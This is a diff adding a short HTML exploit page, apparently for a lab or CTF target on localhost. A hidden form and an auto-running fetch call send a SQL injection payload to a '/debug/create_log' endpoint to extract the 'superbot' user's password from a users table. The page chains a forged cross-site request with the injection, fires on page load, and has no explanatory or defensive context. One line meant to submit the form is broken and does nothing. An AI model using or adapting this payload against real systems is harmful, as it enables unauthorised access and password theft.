@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form action="http://localhost:3000/debug/create_log" method="POST" target="_blank">
+    <input type="hidden" name="log" value="' UNION SELECT password FROM users --">
+    <input type="submit" value="Get Superbot Password">
+  </form>
+  
+  <script>
+    // Alternatively, use fetch API
+    function exploit() {
+      fetch('http://localhost:3000/debug/create_log', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'log=' + encodeURIComponent("' UNION SELECT password FROM users WHERE username='superbot' --")
+      });
+    }
+    exploit();
+    document.forms[0].submit;
+  </script>
+</body>
+</html>
